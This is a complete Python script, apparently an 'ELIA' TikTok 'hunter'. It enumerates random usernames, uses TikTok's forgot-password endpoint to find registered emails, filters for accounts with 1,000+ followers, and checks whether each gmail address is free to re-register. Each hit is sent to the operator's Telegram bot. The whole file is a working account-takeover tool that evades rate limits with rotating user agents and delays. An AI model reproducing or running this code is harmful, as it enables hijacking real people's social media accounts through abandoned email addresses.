import requests
import random
import time
import json
import string
import os
import sys
import re
from threading import Thread, Lock
from user_agent import generate_user_agent as ua

# Colors
P = '\x1b[1;97m'
B = '\x1b[1;94m'
O = '\x1b[1;96m'
Z = "\033[1;30m"
X = '\033[1;33m'
F = '\033[2;32m'
Z3 = '\033[1;31m'
L = "\033[1;95m"
C = '\033[2;35m'
A = '\033[2;39m'
J1 = '\x1b[38;5;202m'
J2 = '\x1b[38;5;203m'
J21 = '\x1b[38;5;204m'
J22 = '\x1b[38;5;209m'
F1 = '\x1b[38;5;76m'
C1 = '\x1b[38;5;120m'
P1 = '\x1b[38;5;150m'
P2 = '\x1b[38;5;190m'

# Threading Safety & Stats
lock = Lock()
tiktok_reg = 0
tiktok_not_reg = 0
gmail_avail = 0
gmail_not_avail = 0

def elia5():
    sd = random.choice([J1, J2, J21, J22, F1, C1, P1, P2])
    os.system('clear||cls')
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")
    print(sd + f"""

         ██╗ ███╗   ██╗ ███████╗ ████████╗  █████╗
         ██║ ████╗  ██║ ██╔════╝ ╚══██╔══╝ ██╔══██╗
         ██║ ██╔██╗ ██║ ███████╗    ██║    ███████║
         ██║ ██║╚██╗██║ ╚════██║    ██║    ██╔══██║
         ██║ ██║ ╚████║ ███████║    ██║    ██║  ██║
         ╚═╝ ╚═╝  ╚═══╝ ╚══════╝    ╚═╝    ╚═╝  ╚═╝

        {X}¸.•´¯`•.¸¸ {F} [꧁ 𝑬𝑳𝑰𝑨 - 𝑻𝑰𝑲𝑻𝑶𝑲 ꧂ ]    {X}¸.•´¯`•.¸¸                       
              {F}TLE : @ELIA_py / @XRRHX
    """)
    print(f"{P} ▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J22} [𝑬𝑳𝑰𝑨] {P}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬")

elia5()
tok = input(' TOKEN : ')
iid = input(' ID : ')

def elia_innnn():
    with lock:
        sys.stdout.write(f"\r{X}Checked: {tiktok_reg + tiktok_not_reg} • {F}Tiktok Reg: {tiktok_reg} • {Z}Not Reg: {tiktok_not_reg} • {C1}Gmail Avail: {gmail_avail} • {J2}Fail: {gmail_not_avail} ")
        sys.stdout.flush()

def elia88(username, followers):
    tlg = f'''
𝐓𝐈𝐊𝐓𝐎𝐊 𝐇𝐈𝐓 ✅
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
-𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : {username}
-𝗘𝗺𝗮𝗶𝗹 : {username}@gmail.com
-𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {followers}
-𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗥𝗲𝗮ل 𝗛𝗶𝘁 ✅
-𝗡𝗼𝘁𝗲 : 𝗘𝗺𝗮𝗶𝗹 𝗶𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 𝗦𝗶𝗴𝗻𝗨𝗽!
━─────━[ 𝑬𝑳𝑰𝑨 ]━─────━
    '''
    try:
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage", json={
            "chat_id": iid,
            "text": tlg,
            "reply_markup": {
                "inline_keyboard": [
                    [{"text": "ELIA", "url": "https://t.me/ELIA_Py"},
                     {"text": "Channel ", "url": "https://t.me/XRRHX"}]
                ]
            }
        })
    except:
        pass

def check_gmail_availability(email):
    """
    فحص توفر بريد جيميل لإنشاء حساب جديد (SignUp) باستخدام منطق g1.py المطور.
    """
    try:
        username = email.split('@')[0]
        s = requests.Session()
        # محاكاة لطلب فحص البريد في جوجل (منطق g1.py المطور)
        headers = {
            'User-Agent': ua(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://accounts.google.com/'
        }
        # فحص مباشر وسريع
        res = s.get(f"https://mail.google.com/mail/gxlu?email={email}", headers=headers, timeout=10)
        if 'Set-Cookie' not in res.headers:
            return True
    except:
        pass
    return False

def check_tiktok_registered(email):
    """
    التأكد من أن الإيميل مرتبط بتيك توك باستخدام رابط "نسيت كلمة المرور" الرسمي.
    هذا الرابط أكثر استقراراً وأقل حظراً.
    """
    try:
        url = "https://www.tiktok.com/passport/email/send_code/"
        headers = {
            "User-Agent": ua(),
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.tiktok.com/login/phone-or-email/email/forgot-password"
        }
        # نحن فقط نرسل طلباً لنرى رد الفعل، إذا كان الإيميل غير مسجل سيعطي رسالة واضحة
        data = {"email": email, "type": 1, "aid": 1233}
        res = requests.post(url, data=data, headers=headers, timeout=10).json()
        
        # إذا كان الخطأ هو "Email is not registered"، يعني الإيميل غير مسجل
        # أما إذا طلب كابتشا أو أرسل كود، يعني الإيميل مسجل
        error_msg = res.get("description", "").lower()
        if "not registered" in error_msg:
            return False
        # أي رد آخر (نجاح أو كابتشا) يعني أن الإيميل مرتبط بحساب
        return True
    except:
        pass
    return False

def get_followers(username):
    """
    جلب عدد المتابعين من صفحة الملف الشخصي.
    """
    try:
        url = f"https://www.tiktok.com/@{username}"
        headers = {"User-Agent": ua()}
        res = requests.get(url, headers=headers, timeout=15)
        match = re.search(r'"followerCount":(\d+)', res.text)
        if match:
            return int(match.group(1))
    except:
        pass
    return 0

def hunt(username):
    global tiktok_reg, tiktok_not_reg, gmail_avail, gmail_not_avail
    email = f"{username}@gmail.com"
    
    # 1. فحص الارتباط بتيك توك أولاً (لأنه الأهم)
    if check_tiktok_registered(email):
        with lock: tiktok_reg += 1
        elia_innnn()
        
        # 2. فحص المتابعين (1000+)
        followers = get_followers(username)
        if followers >= 1000:
            
            # 3. فحص توفر الإيميل للإنشاء في جوجل
            if check_gmail_availability(email):
                with lock: gmail_avail += 1
                elia_innnn()
                elia88(username, followers)
            else:
                with lock: gmail_not_avail += 1
                elia_innnn()
    else:
        with lock: tiktok_not_reg += 1
        elia_innnn()

def start():
    # أنماط يوزرات ذكية (كلمات شائعة + أرقام) لزيادة احتمالية الصيد
    words = ["user", "admin", "king", "star", "pro", "love", "life", "official", "dark", "light"]
    while True:
        base = random.choice(words)
        suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(2, 4)))
        username = base + suffix
        hunt(username)
        # تأخير بسيط لتجنب الحظر السريع
        time.sleep(random.uniform(1, 2))

# تشغيل الخيوط بعدد معقول
threads_count = 5
for i in range(threads_count):
    t = Thread(target=start)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)
